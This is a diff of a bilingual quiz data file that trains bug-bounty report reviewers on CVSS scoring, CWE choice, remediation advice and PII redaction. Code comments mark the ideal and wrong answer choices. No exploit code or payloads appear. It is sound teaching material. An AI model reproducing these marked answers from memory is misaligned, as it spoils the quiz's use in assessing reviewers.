+                tip: "**Tip:** Realistic distribution: social DM, ad networks, phishing email, SaaS invite links. **If you can't name how the attacker reaches the victim, the Impact is hypothetical** — score Dim 7 strictly.",
               },
             },
           },
@@ -2410,10 +2497,8 @@
                 "(Reporter argues all-H CIA because it's admin-tier)",
             },
             context: {
-              ja:
-                "BBR-Review `cvss-guide.md` の指摘：**9.8 主張の約 6 割は PR / UI ベクトルが過大**。実体は **SSO 管理者ログイン後しか到達できない debug panel の Stored XSS**：攻撃には admin SSO セッションが必要 (`PR:H`)、admin がパネルを開く必要 (`UI:R`)、admin から他ユーザーセッションへ波及可能 (`S:C`)、漏洩データは当該パネルの少量メタデータのみ (`C:L/I:L`)。BBR 参考ベクトル: `Stored XSS (cross-user) = AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4 Med)。",
-              en:
-                "BBR-Review `cvss-guide.md` notes ~60% of 9.8 claims inflate PR/UI. Real finding: **Stored XSS in an admin-only debug panel reachable only after SSO admin login** — exploit needs admin SSO (`PR:H`), admin must open the panel (`UI:R`), admin → cross-user session impact (`S:C`), exposed data is limited panel metadata (`C:L/I:L`). BBR reference vector: `Stored XSS (cross-user) = AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4 Med).",
+              ja: "BBR-Review `cvss-guide.md` の指摘：**9.8 主張の約 6 割は PR / UI ベクトルが過大**。実体は **SSO 管理者ログイン後しか到達できない debug panel の Stored XSS**：攻撃には admin SSO セッションが必要 (`PR:H`)、admin がパネルを開く必要 (`UI:R`)、admin から他ユーザーセッションへ波及可能 (`S:C`)、漏洩データは当該パネルの少量メタデータのみ (`C:L/I:L`)。BBR 参考ベクトル: `Stored XSS (cross-user) = AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4 Med)。",
+              en: "BBR-Review `cvss-guide.md` notes ~60% of 9.8 claims inflate PR/UI. Real finding: **Stored XSS in an admin-only debug panel reachable only after SSO admin login** — exploit needs admin SSO (`PR:H`), admin must open the panel (`UI:R`), admin → cross-user session impact (`S:C`), exposed data is limited panel metadata (`C:L/I:L`). BBR reference vector: `Stored XSS (cross-user) = AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` (5.4 Med).",
             },
             question: {
               ja: "BBR-Review `cvss-guide.md` に従った CVSS 修正案はどれですか？",
@@ -2422,24 +2507,18 @@
             choices: [
               {
                 // ○ near — PR/UI は直すが S/CIA を据え置く（典型的 over-claim 残り）
-                ja:
-                  "`PR:H` と `UI:R` までは修正するが、`S:U` のまま、CIA は **`C:H/I:H/A:H` を維持** して 7.2 High 相当に据え置く（admin 影響だから CIA 高、と主張）。",
-                en:
-                  "Fix `PR:H` and `UI:R`, but **leave `S:U` and keep `C:H/I:H/A:H`** at 7.2 High (\"admin impact = CIA high\").",
+                ja: "`PR:H` と `UI:R` までは修正するが、`S:U` のまま、CIA は **`C:H/I:H/A:H` を維持** して 7.2 High 相当に据え置く（admin 影響だから CIA 高、と主張）。",
+                en: 'Fix `PR:H` and `UI:R`, but **leave `S:U` and keep `C:H/I:H/A:H`** at 7.2 High ("admin impact = CIA high").',
               },
               {
                 // ◎ ideal — BBR-Review reference vector に最も近い
-                ja:
-                  "`CVSS:3.1/AV:N/AC:L/`**`PR:H/UI:R/S:C`**`/C:L/I:L/A:N` ≈ **4.7 Medium**。`PR:H`（admin SSO 必須）、`UI:R`（admin がパネルを開く必要）、`S:C`（admin → 他ユーザー session 影響可能）、漏洩物は少量メタデータのため `C:L/I:L`。BBR-Review 参考ベクトル `Stored XSS (cross-user)` (5.4 Med) と整合。",
-                en:
-                  "`CVSS:3.1/AV:N/AC:L/`**`PR:H/UI:R/S:C`**`/C:L/I:L/A:N` ≈ **4.7 Medium**. `PR:H` (admin SSO needed), `UI:R` (admin must open the panel), `S:C` (admin → cross-user session impact), and `C:L/I:L` for limited metadata exposure. Aligns with BBR-Review's `Stored XSS (cross-user)` reference vector (5.4 Med).",
+                ja: "`CVSS:3.1/AV:N/AC:L/`**`PR:H/UI:R/S:C`**`/C:L/I:L/A:N` ≈ **4.7 Medium**。`PR:H`（admin SSO 必須）、`UI:R`（admin がパネルを開く必要）、`S:C`（admin → 他ユーザー session 影響可能）、漏洩物は少量メタデータのため `C:L/I:L`。BBR-Review 参考ベクトル `Stored XSS (cross-user)` (5.4 Med) と整合。",
+                en: "`CVSS:3.1/AV:N/AC:L/`**`PR:H/UI:R/S:C`**`/C:L/I:L/A:N` ≈ **4.7 Medium**. `PR:H` (admin SSO needed), `UI:R` (admin must open the panel), `S:C` (admin → cross-user session impact), and `C:L/I:L` for limited metadata exposure. Aligns with BBR-Review's `Stored XSS (cross-user)` reference vector (5.4 Med).",
               },
               {
                 // △ ordinary — Reflected XSS と同じ過大評価パターン（BBR-Review 指摘 mis-scoring）
-                ja:
-                  "Reflected XSS と同等視して `PR:N / UI:R` のまま `C:H/I:H/A:H` を維持し 8.2 High に据え置く（BBR-Review が **mis-scoring trap** として明示する『Reflected XSS を C:H/I:H/A:H にする』誤り）。",
-                en:
-                  "Treat it like Reflected XSS — keep `PR:N / UI:R` with `C:H/I:H/A:H` at 8.2 High (the **mis-scoring trap BBR-Review names** explicitly).",
+                ja: "Reflected XSS と同等視して `PR:N / UI:R` のまま `C:H/I:H/A:H` を維持し 8.2 High に据え置く（BBR-Review が **mis-scoring trap** として明示する『Reflected XSS を C:H/I:H/A:H にする』誤り）。",
+                en: "Treat it like Reflected XSS — keep `PR:N / UI:R` with `C:H/I:H/A:H` at 8.2 High (the **mis-scoring trap BBR-Review names** explicitly).",
               },
               {
                 // × far
@@ -2447,19 +2526,14 @@
                 en: "Drop to 0.0 Informational because it's admin-only.",
               },
             ],
-            kinds: ["near", "ideal", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 8 は **CVSS = 前提条件の翻訳作業**。BBR-Review `cvss-guide.md` が指摘する典型 mis-scoring: (1) **Reflected XSS を C:H/I:H/A:H に振る**、(2) **Self-XSS を UI:N**、(3) **CSRF を S:C/C:H/I:H/A:H**、(4) **Blind SSRF を C:N/I:N/A:N**。1 ベクトルずつ root cause に翻訳すれば自動で score は揃います。HackerOne / Intigriti は v3.1 を標準に v4.0 への手動移行を要求（auto-conversion 不可）。",
-                tip:
-                  "**Tip:** Severity Cap を持つプログラム (例: `H1 / Bugcrowd VRT / Intigriti v1.3`) では、計算した Base score がプログラム上限を超えても triage は cap で記録します。CVSS 自体は変えず、result セクションで cap を明記するのが BBR-Review 流。",
+                ok: "Dim 8 は **CVSS = 前提条件の翻訳作業**。BBR-Review `cvss-guide.md` が指摘する典型 mis-scoring: (1) **Reflected XSS を C:H/I:H/A:H に振る**、(2) **Self-XSS を UI:N**、(3) **CSRF を S:C/C:H/I:H/A:H**、(4) **Blind SSRF を C:N/I:N/A:N**。1 ベクトルずつ root cause に翻訳すれば自動で score は揃います。HackerOne / Intigriti は v3.1 を標準に v4.0 への手動移行を要求（auto-conversion 不可）。",
+                tip: "**Tip:** Severity Cap を持つプログラム (例: `H1 / Bugcrowd VRT / Intigriti v1.3`) では、計算した Base score がプログラム上限を超えても triage は cap で記録します。CVSS 自体は変えず、result セクションで cap を明記するのが BBR-Review 流。",
               },
               en: {
-                ok:
-                  "Dim 8 = **CVSS as translation, not opinion**. BBR-Review `cvss-guide.md` names four mis-scoring traps: (1) **Reflected XSS at C:H/I:H/A:H**, (2) **Self-XSS at UI:N**, (3) **CSRF at S:C/C:H/I:H/A:H**, (4) **Blind SSRF at C:N/I:N/A:N**. Walk one vector at a time and the score follows. HackerOne / Intigriti use v3.1 as the standard; **v3.1 ↔ v4.0 has no auto-conversion** and requires manual review.",
-                tip:
-                  "**Tip:** When a program imposes a Severity Cap (`H1 / Bugcrowd VRT / Intigriti v1.3`), keep the computed Base unchanged and record the cap explicitly in the result section — that's the BBR-Review style.",
+                ok: "Dim 8 = **CVSS as translation, not opinion**. BBR-Review `cvss-guide.md` names four mis-scoring traps: (1) **Reflected XSS at C:H/I:H/A:H**, (2) **Self-XSS at UI:N**, (3) **CSRF at S:C/C:H/I:H/A:H**, (4) **Blind SSRF at C:N/I:N/A:N**. Walk one vector at a time and the score follows. HackerOne / Intigriti use v3.1 as the standard; **v3.1 ↔ v4.0 has no auto-conversion** and requires manual review.",
+                tip: "**Tip:** When a program imposes a Severity Cap (`H1 / Bugcrowd VRT / Intigriti v1.3`), keep the computed Base unchanged and record the cap explicitly in the result section — that's the BBR-Review style.",
               },
             },
           },
@@ -2479,10 +2553,8 @@
                 "References: **every OWASP Top 10 item**, CVE-2014-0160 (Heartbleed), CVE-2024-ABCDE",
             },
             context: {
-              ja:
-                "BBR-Review Dim 9（**3 点**）は **CWE が MITRE 実在番号** であること、**single root-cause CWE** を選ぶこと、**Bugcrowd では VRT category 併記** で duplicate detection を高速化することを要求。`CWE-9999` と `CVE-2024-ABCDE` は **AI hallucination の典型 signal #2**（Dim 13 にも波及）。実体は **`/api/profile?id=<int>` の IDOR**（連番 ID で他ユーザー PII を read）。",
-              en:
-                "BBR-Review Dim 9 (**3 pt**): CWE must **exist on MITRE**, prefer a **single root-cause CWE**, and on Bugcrowd add the **VRT category** for fast dedup. `CWE-9999` and `CVE-2024-ABCDE` are textbook **AI hallucination signal #2** (also pollutes Dim 13). Real finding: **IDOR at `/api/profile?id=<int>`** (sequential IDs, leaks other users' PII).",
+              ja: "BBR-Review Dim 9（**3 点**）は **CWE が MITRE 実在番号** であること、**single root-cause CWE** を選ぶこと、**Bugcrowd では VRT category 併記** で duplicate detection を高速化することを要求。`CWE-9999` と `CVE-2024-ABCDE` は **AI hallucination の典型 signal #2**（Dim 13 にも波及）。実体は **`/api/profile?id=<int>` の IDOR**（連番 ID で他ユーザー PII を read）。",
+              en: "BBR-Review Dim 9 (**3 pt**): CWE must **exist on MITRE**, prefer a **single root-cause CWE**, and on Bugcrowd add the **VRT category** for fast dedup. `CWE-9999` and `CVE-2024-ABCDE` are textbook **AI hallucination signal #2** (also pollutes Dim 13). Real finding: **IDOR at `/api/profile?id=<int>`** (sequential IDs, leaks other users' PII).",
             },
             question: {
               ja: "BBR-Review Dim 9 の rubric に最も沿う CWE / References 修正は？",
@@ -2491,24 +2563,18 @@
             choices: [
               {
                 // △ ordinary — CWE-200 は影響側の分類で root cause としてミスマッチ
-                ja:
-                  "**`CWE-200: Information Disclosure`** + OWASP A01。 (本件の root cause は access control。`CWE-200` は影響側の分類で **root cause としてはミスマッチ** — Dim 9 で 1/3 程度)",
-                en:
-                  "**`CWE-200: Information Disclosure`** + OWASP A01. (Root cause is access control; `CWE-200` describes the *outcome* side and **mismatches the root** — Dim 9 ≈ 1/3.)",
+                ja: "**`CWE-200: Information Disclosure`** + OWASP A01。 (本件の root cause は access control。`CWE-200` は影響側の分類で **root cause としてはミスマッチ** — Dim 9 で 1/3 程度)",
+                en: "**`CWE-200: Information Disclosure`** + OWASP A01. (Root cause is access control; `CWE-200` describes the *outcome* side and **mismatches the root** — Dim 9 ≈ 1/3.)",
               },
               {
                 // ○ near — 上位 CWE-284 は誤りではないが、より精度が高い CWE-639 がある
-                ja:
-                  "**`CWE-284: Improper Access Control`** 単独 + OWASP A01。（誤りではないが、より精度の高い `CWE-639` がある — Dim 9 ≈ 2/3）",
-                en:
-                  "**`CWE-284: Improper Access Control`** + OWASP A01. (Not wrong, but a more precise `CWE-639` exists — Dim 9 ≈ 2/3.)",
+                ja: "**`CWE-284: Improper Access Control`** 単独 + OWASP A01。（誤りではないが、より精度の高い `CWE-639` がある — Dim 9 ≈ 2/3）",
+                en: "**`CWE-284: Improper Access Control`** + OWASP A01. (Not wrong, but a more precise `CWE-639` exists — Dim 9 ≈ 2/3.)",
               },
               {
                 // ◎ ideal — root cause CWE + Bugcrowd VRT + 関連リファのみ
-                ja:
-                  "**`CWE-639: Authorization Bypass Through User-Controlled Key`**（root cause を 1 件に絞る）。**Bugcrowd VRT:** `Broken Access Control > IDOR > Application-Specific`。**References** は本件と直接関係する **OWASP A01:2021 Broken Access Control のみ** 残し、Heartbleed / CVE-2024-ABCDE 等の無関係リファと OWASP 全項目スパムは削除。CWE-9999 は MITRE 不存在 (AI hallucination) 旨を指摘。",
-                en:
-                  "**`CWE-639: Authorization Bypass Through User-Controlled Key`** as the single root cause. **Bugcrowd VRT:** `Broken Access Control > IDOR > Application-Specific`. **References** trimmed to only **OWASP A01:2021 Broken Access Control**; remove Heartbleed / `CVE-2024-ABCDE` / OWASP-Top-10-spam. Flag `CWE-9999` as a non-existent ID (AI hallucination).",
+                ja: "**`CWE-639: Authorization Bypass Through User-Controlled Key`**（root cause を 1 件に絞る）。**Bugcrowd VRT:** `Broken Access Control > IDOR > Application-Specific`。**References** は本件と直接関係する **OWASP A01:2021 Broken Access Control のみ** 残し、Heartbleed / CVE-2024-ABCDE 等の無関係リファと OWASP 全項目スパムは削除。CWE-9999 は MITRE 不存在 (AI hallucination) 旨を指摘。",
+                en: "**`CWE-639: Authorization Bypass Through User-Controlled Key`** as the single root cause. **Bugcrowd VRT:** `Broken Access Control > IDOR > Application-Specific`. **References** trimmed to only **OWASP A01:2021 Broken Access Control**; remove Heartbleed / `CVE-2024-ABCDE` / OWASP-Top-10-spam. Flag `CWE-9999` as a non-existent ID (AI hallucination).",
               },
               {
                 // × far
@@ -2516,19 +2582,14 @@
                 en: "Accept as-is — CWE doesn't matter.",
               },
             ],
-            kinds: ["ordinary", "near", "ideal", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 9 満点 (3/3) は **MITRE 実在の single root-cause CWE + 直接関係する参考のみ + Bugcrowd VRT 併記**。CWE は『分類の遊び』ではなく、開発側の **修正方針を 1 つに絞る入口**。`CWE-9999` `CVE-2024-ABCDE` `SafeInputValidator` 等の存在しない識別子は **Dim 13 の AI hallucination signal #2** を直撃します。",
-                tip:
-                  "**Tip:** OWASP 全項目スパムは AI 生成レポートの強い signal。**1 主張 = 1 リファ** をルールにすると、AI 風の bullet-point proliferation も同時に消えます。",
+                ok: "Dim 9 満点 (3/3) は **MITRE 実在の single root-cause CWE + 直接関係する参考のみ + Bugcrowd VRT 併記**。CWE は『分類の遊び』ではなく、開発側の **修正方針を 1 つに絞る入口**。`CWE-9999` `CVE-2024-ABCDE` `SafeInputValidator` 等の存在しない識別子は **Dim 13 の AI hallucination signal #2** を直撃します。",
+                tip: "**Tip:** OWASP 全項目スパムは AI 生成レポートの強い signal。**1 主張 = 1 リファ** をルールにすると、AI 風の bullet-point proliferation も同時に消えます。",
               },
               en: {
-                ok:
-                  "Dim 9 awards full 3/3 for **a real, single root-cause CWE + only directly-relevant references + Bugcrowd VRT**. CWE picks the developer's *fix angle*. Non-existent IDs (`CWE-9999`, `CVE-2024-ABCDE`, `SafeInputValidator`) trip **Dim 13 AI signal #2** directly.",
-                tip:
-                  "**Tip:** OWASP-Top-10 reference spam is a strong AI-text signal. A **one-claim-one-reference** rule cleans both Dim 9 and Dim 13's bullet-point proliferation.",
+                ok: "Dim 9 awards full 3/3 for **a real, single root-cause CWE + only directly-relevant references + Bugcrowd VRT**. CWE picks the developer's *fix angle*. Non-existent IDs (`CWE-9999`, `CVE-2024-ABCDE`, `SafeInputValidator`) trip **Dim 13 AI signal #2** directly.",
+                tip: "**Tip:** OWASP-Top-10 reference spam is a strong AI-text signal. A **one-claim-one-reference** rule cleans both Dim 9 and Dim 13's bullet-point proliferation.",
               },
             },
           },
@@ -2544,10 +2605,8 @@
               en: "Just fix it.",
             },
             context: {
-              ja:
-                "BBR-Review Dim 10（**5 点**）は **対象アプリの tech stack に合わせた具体ライブラリ名 + 多重防御 + 回帰テスト + 副作用言及** を要求。BBR が紹介する secure-by-default ライブラリ：HTML サニタイズ — **DOMPurify (JS)** / **Bleach (Python)** / **Ammonia (Rust)**、HTTP ヘッダ — **Helmet.js / secure_headers (Ruby)**、CSRF — **Gorilla CSRF (Go)** / Django built-in、暗号 — **Google Tink / Themis**、XML — **defusedxml**、SSRF — **ssrf_filter / ssrf-req-filter**。NG 例: 『Sanitize user input』『Implement a whitelist』『Update to latest version』。実体は **Node.js + React アプリの bio フィールドの Stored XSS**（client 側のみエスケープ、server 側で HTML 解釈）。",
-              en:
-                "BBR-Review Dim 10 (**5 pt**) demands **stack-specific library names + defense-in-depth + a regression test + side-effect notes**. Secure-by-default libraries the repo lists: HTML sanitization — **DOMPurify (JS)** / **Bleach (Python)** / **Ammonia (Rust)**; HTTP headers — **Helmet.js / secure_headers (Ruby)**; CSRF — **Gorilla CSRF (Go)** / Django built-in; crypto — **Google Tink / Themis**; XML — **defusedxml**; SSRF filters — **ssrf_filter / ssrf-req-filter**. Bad examples: \"Sanitize user input\" / \"Implement a whitelist\" / \"Update to latest version\". Real finding: **Stored XSS in the bio field of a Node.js + React app** (client-only escape; HTML interpreted server-side).",
+              ja: "BBR-Review Dim 10（**5 点**）は **対象アプリの tech stack に合わせた具体ライブラリ名 + 多重防御 + 回帰テスト + 副作用言及** を要求。BBR が紹介する secure-by-default ライブラリ：HTML サニタイズ — **DOMPurify (JS)** / **Bleach (Python)** / **Ammonia (Rust)**、HTTP ヘッダ — **Helmet.js / secure_headers (Ruby)**、CSRF — **Gorilla CSRF (Go)** / Django built-in、暗号 — **Google Tink / Themis**、XML — **defusedxml**、SSRF — **ssrf_filter / ssrf-req-filter**。NG 例: 『Sanitize user input』『Implement a whitelist』『Update to latest version』。実体は **Node.js + React アプリの bio フィールドの Stored XSS**（client 側のみエスケープ、server 側で HTML 解釈）。",
+              en: 'BBR-Review Dim 10 (**5 pt**) demands **stack-specific library names + defense-in-depth + a regression test + side-effect notes**. Secure-by-default libraries the repo lists: HTML sanitization — **DOMPurify (JS)** / **Bleach (Python)** / **Ammonia (Rust)**; HTTP headers — **Helmet.js / secure_headers (Ruby)**; CSRF — **Gorilla CSRF (Go)** / Django built-in; crypto — **Google Tink / Themis**; XML — **defusedxml**; SSRF filters — **ssrf_filter / ssrf-req-filter**. Bad examples: "Sanitize user input" / "Implement a whitelist" / "Update to latest version". Real finding: **Stored XSS in the bio field of a Node.js + React app** (client-only escape; HTML interpreted server-side).',
             },
             question: {
               ja: "BBR-Review Dim 10 の Good example の構造に最も合うのはどれ？",
@@ -2556,53 +2615,43 @@
             choices: [
               {
                 // ○ near — root cause + 適切ライブラリだが defense-in-depth/regression-test/side-effect が欠ける
-                ja:
-                  "「server 側で **DOMPurify (server bundle)** を通せばよい。」 (ライブラリ名は具体だが **CSP / 回帰テスト / staged deploy 等の defense-in-depth と side effect 言及が欠落** — Dim 10 ≈ 3/5)",
-                en:
-                  "\"Run the bio HTML through **DOMPurify (server bundle)** on the server.\" (Specific library, but **defense-in-depth like CSP / regression test / side-effect notes are missing** — Dim 10 ≈ 3/5.)",
+                ja: "「server 側で **DOMPurify (server bundle)** を通せばよい。」 (ライブラリ名は具体だが **CSP / 回帰テスト / staged deploy 等の defense-in-depth と side effect 言及が欠落** — Dim 10 ≈ 3/5)",
+                en: '"Run the bio HTML through **DOMPurify (server bundle)** on the server." (Specific library, but **defense-in-depth like CSP / regression test / side-effect notes are missing** — Dim 10 ≈ 3/5.)',
               },
               {
                 // △ ordinary — BBR-Review が Bad example として挙げる generic 文言
-                ja:
-                  "「`Sanitize user input` および `Implement a whitelist`」 (BBR-Review が **Bad example** として明示する generic 文言)",
-                en:
-                  "\"`Sanitize user input` and `Implement a whitelist`.\" (Both are literal **Bad examples** in BBR-Review.)",
+                ja: "「`Sanitize user input` および `Implement a whitelist`」 (BBR-Review が **Bad example** として明示する generic 文言)",
+                en: '"`Sanitize user input` and `Implement a whitelist`." (Both are literal **Bad examples** in BBR-Review.)',
               },
               {
                 // ◎ ideal — stack-specific × defense-in-depth × regression test × side effect
-                ja:
-                  "**Server-side**: bio HTML を render 時に **`DOMPurify` (server-side bundle)** または Python なら **`bleach`** の allow-list policy へ通す。**client-only エスケープは insufficient** と明記。**Defense-in-depth**: **`Content-Security-Policy: script-src 'self'; object-src 'none'`** を追加し、**`Helmet.js`** で他 secure headers (X-Frame-Options / Referrer-Policy) も設定。**Regression test**: 本 PoC payload を XSS 検知ユニットテストとして CI に組み込む（PoC = post-fix QA）。**Side effect**: 既存 bio の HTML 表現が制限されるため staged deploy で UX 影響を確認。",
-                en:
-                  "**Server-side**: run bio HTML through **`DOMPurify` (server-side bundle)** or **`bleach`** (Python) under an allow-list policy. **State explicitly that client-only escape is insufficient.** **Defense-in-depth**: add **`Content-Security-Policy: script-src 'self'; object-src 'none'`** and use **`Helmet.js`** for the other secure headers. **Regression test**: turn the supplied PoC payload into a CI XSS-unit test (the PoC doubles as post-fix QA). **Side effect**: existing bio HTML rendering is restricted — verify UX impact via staged deploy.",
+                ja: "**Server-side**: bio HTML を render 時に **`DOMPurify` (server-side bundle)** または Python なら **`bleach`** の allow-list policy へ通す。**client-only エスケープは insufficient** と明記。**Defense-in-depth**: **`Content-Security-Policy: script-src 'self'; object-src 'none'`** を追加し、**`Helmet.js`** で他 secure headers (X-Frame-Options / Referrer-Policy) も設定。**Regression test**: 本 PoC payload を XSS 検知ユニットテストとして CI に組み込む（PoC = post-fix QA）。**Side effect**: 既存 bio の HTML 表現が制限されるため staged deploy で UX 影響を確認。",
+                en: "**Server-side**: run bio HTML through **`DOMPurify` (server-side bundle)** or **`bleach`** (Python) under an allow-list policy. **State explicitly that client-only escape is insufficient.** **Defense-in-depth**: add **`Content-Security-Policy: script-src 'self'; object-src 'none'`** and use **`Helmet.js`** for the other secure headers. **Regression test**: turn the supplied PoC payload into a CI XSS-unit test (the PoC doubles as post-fix QA). **Side effect**: existing bio HTML rendering is restricted — verify UX impact via staged deploy.",
               },
               {
                 // × far — BBR-Review の Bad example "Update to latest version" の延長
-                ja:
-                  "「AI でコードベース全体をリライトしてください」「該当機能を永久廃止」「Update to latest version」のいずれか。",
-                en:
-                  "\"Use an AI to rewrite the whole codebase\" / \"disable the feature forever\" / \"update to the latest version\" (avoiding root cause).",
+                ja: "「AI でコードベース全体をリライトしてください」「該当機能を永久廃止」「Update to latest version」のいずれか。",
+                en: '"Use an AI to rewrite the whole codebase" / "disable the feature forever" / "update to the latest version" (avoiding root cause).',
               },
             ],
-            kinds: ["near", "ordinary", "ideal", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 10 満点 (5/5) は **stack-specific ライブラリ名 × 多重防御 × regression test × side effect**。BBR-Review は『PoC = post-fix QA』として **PoC をそのまま回帰テストに転用** する文化を推している点が特徴。CSP の具体値（`script-src 'self'; object-src 'none'`）まで書くと、開発側のフィードバックループが 1 ラウンド減ります。",
-                tip:
-                  "**Tip:** 『Sanitize user input』『Implement a whitelist』『Update to latest version』は BBR-Review の Bad example トリオ。具体度を 1 段上げる（→ DOMPurify、CSP 値、テスト関数名）だけで通りやすさが変わります。",
+                ok: "Dim 10 満点 (5/5) は **stack-specific ライブラリ名 × 多重防御 × regression test × side effect**。BBR-Review は『PoC = post-fix QA』として **PoC をそのまま回帰テストに転用** する文化を推している点が特徴。CSP の具体値（`script-src 'self'; object-src 'none'`）まで書くと、開発側のフィードバックループが 1 ラウンド減ります。",
+                tip: "**Tip:** 『Sanitize user input』『Implement a whitelist』『Update to latest version』は BBR-Review の Bad example トリオ。具体度を 1 段上げる（→ DOMPurify、CSP 値、テスト関数名）だけで通りやすさが変わります。",
               },
               en: {
-                ok:
-                  "Dim 10 awards full 5/5 for **stack-specific libraries × defense-in-depth × a regression test × side-effect notes**. BBR-Review's signature is **\"PoC = post-fix QA\"** — turn the supplied PoC into a regression test directly. Naming concrete CSP values (`script-src 'self'; object-src 'none'`) shaves a round-trip off the fix loop.",
-                tip:
-                  "**Tip:** \"Sanitize user input\" / \"Implement a whitelist\" / \"Update to latest version\" are BBR-Review's Bad-example trio. One concrete step up — DOMPurify, an exact CSP value, a test name — visibly raises Dim 10.",
+                ok: "Dim 10 awards full 5/5 for **stack-specific libraries × defense-in-depth × a regression test × side-effect notes**. BBR-Review's signature is **\"PoC = post-fix QA\"** — turn the supplied PoC into a regression test directly. Naming concrete CSP values (`script-src 'self'; object-src 'none'`) shaves a round-trip off the fix loop.",
+                tip: '**Tip:** "Sanitize user input" / "Implement a whitelist" / "Update to latest version" are BBR-Review\'s Bad-example trio. One concrete step up — DOMPurify, an exact CSP value, a test name — visibly raises Dim 10.',
               },
             },
           },
 
           /* --- 11. Supporting Materials (6pt) --- */
           {
-            tag: { ja: "11 · Supporting Materials", en: "11 · Supporting Materials" },
+            tag: {
+              ja: "11 · Supporting Materials",
+              en: "11 · Supporting Materials",
+            },
             dim: { ja: "添付資料", en: "Supporting Materials" },
             weight: 6,
             section: { ja: "Attachments", en: "Attachments" },
@@ -2621,10 +2670,8 @@
                 " · Later half wanders into unrelated YouTube",
             },
             context: {
-              ja:
-                "BBR-Review Dim 11（**6 点**）は **30 秒〜2 分の動画 + 機微情報 redact + 注釈 + descriptive filename + 重要 HTTP は req/res をテキスト化** を要求。**実 PII がそのまま映っているのは Intigriti `Real PII verification` 違反** で、**Dim 11 = 0 + Critical 違反** にエスカレーションされる。",
-              en:
-                "BBR-Review Dim 11 (**6 pt**) demands **30s–2min video + sensitive data redaction + annotations + descriptive filenames + critical HTTP req/res as text**. **Real PII left visible is an Intigriti `Real PII verification` violation**, escalating to **Dim 11 = 0 + Critical violation**.",
+              ja: "BBR-Review Dim 11（**6 点**）は **30 秒〜2 分の動画 + 機微情報 redact + 注釈 + descriptive filename + 重要 HTTP は req/res をテキスト化** を要求。**実 PII がそのまま映っているのは Intigriti `Real PII verification` 違反** で、**Dim 11 = 0 + Critical 違反** にエスカレーションされる。",
+              en: "BBR-Review Dim 11 (**6 pt**) demands **30s–2min video + sensitive data redaction + annotations + descriptive filenames + critical HTTP req/res as text**. **Real PII left visible is an Intigriti `Real PII verification` violation**, escalating to **Dim 11 = 0 + Critical violation**.",
             },
             question: {
               ja: "BBR-Review Dim 11 + Intigriti compliance を満たす差し替え依頼は？",
@@ -2633,24 +2680,18 @@
             choices: [
               {
                 // ○ near
-                ja:
-                  "**90 秒以内** の再録画（個人 DM タブ非表示、実顧客 PII redact）までは依頼する。HTTP req/res のテキスト化、annotation、descriptive filename の依頼は省略。",
-                en:
-                  "Ask for a **re-record under 90 s** (DM tab hidden, real customer PII redacted), but skip the HTTP req/res text conversion, annotations, and descriptive filenames.",
+                ja: "**90 秒以内** の再録画（個人 DM タブ非表示、実顧客 PII redact）までは依頼する。HTTP req/res のテキスト化、annotation、descriptive filename の依頼は省略。",
+                en: "Ask for a **re-record under 90 s** (DM tab hidden, real customer PII redacted), but skip the HTTP req/res text conversion, annotations, and descriptive filenames.",
               },
               {
                 // ◎ ideal
-                ja:
-                  "**90 秒以内** で再録画依頼: (a) 対象アプリ画面のみで個人 DM / 顧客 PII を redact、(b) 重要な HTTP req/res は **テキストのコードブロック** で再添付（screenshot HTTP は copy-pastable でなく Dim 5/11 で減点）、(c) **注釈付きスクリーンショット**（payload を arrow / highlight で強調）と **descriptive filename** (`xss-poc.mp4` `bio-xss-200-resp.png`)。**実 PII 露出は Intigriti `Real PII verification` 違反** なので、レポーター本人の保護にもなる旨も添える。",
-                en:
-                  "Request a **re-record under 90 s**: (a) target app only, with DM tabs and real customer PII redacted; (b) re-attach critical HTTP req/res as **text in code blocks** (screenshot HTTP loses points in Dim 5/11 because it's not copy-pastable); (c) **annotated screenshots** (arrows / highlights on the payload) with **descriptive filenames** (`xss-poc.mp4`, `bio-xss-200-resp.png`). Mention that **real PII on screen violates Intigriti's `Real PII verification`** rule — this protects the reporter too.",
+                ja: "**90 秒以内** で再録画依頼: (a) 対象アプリ画面のみで個人 DM / 顧客 PII を redact、(b) 重要な HTTP req/res は **テキストのコードブロック** で再添付（screenshot HTTP は copy-pastable でなく Dim 5/11 で減点）、(c) **注釈付きスクリーンショット**（payload を arrow / highlight で強調）と **descriptive filename** (`xss-poc.mp4` `bio-xss-200-resp.png`)。**実 PII 露出は Intigriti `Real PII verification` 違反** なので、レポーター本人の保護にもなる旨も添える。",
+                en: "Request a **re-record under 90 s**: (a) target app only, with DM tabs and real customer PII redacted; (b) re-attach critical HTTP req/res as **text in code blocks** (screenshot HTTP loses points in Dim 5/11 because it's not copy-pastable); (c) **annotated screenshots** (arrows / highlights on the payload) with **descriptive filenames** (`xss-poc.mp4`, `bio-xss-200-resp.png`). Mention that **real PII on screen violates Intigriti's `Real PII verification`** rule — this protects the reporter too.",
               },
               {
                 // △ ordinary
-                ja:
-                  "メタデータだけ消して既存動画を社内エンジニアに共有する（DM タブと顧客 PII は映ったまま）。",
-                en:
-                  "Strip metadata and forward the existing video to engineering (DM tab + customer PII still visible).",
+                ja: "メタデータだけ消して既存動画を社内エンジニアに共有する（DM タブと顧客 PII は映ったまま）。",
+                en: "Strip metadata and forward the existing video to engineering (DM tab + customer PII still visible).",
               },
               {
                 // × far
@@ -2658,19 +2699,14 @@
                 en: "Close the report as N/A immediately because the video is sloppy.",
               },
             ],
-            kinds: ["near", "ideal", "ordinary", "far"],
             ex: {
               ja: {
-                ok:
-                  "Dim 11 満点 (6/6) は **30 秒〜2 分動画 × 機微 redact × 注釈 × descriptive filename × 重要 HTTP テキスト化**。BBR-Review が強調する **『動画より、payload を強調した一連のスクリーンショット』** は、開発担当者の追試効率と修正速度の双方に効きます。**実 PII 残置は Critical 違反** なので、即書き直し依頼が必須。",
-                tip:
-                  "**Tip:** Intigriti v1.3 禁止条項 **D. Real PII verification** をそのまま引用すると、レポーター側も納得しやすく、結果として再投稿の速度が上がります。",
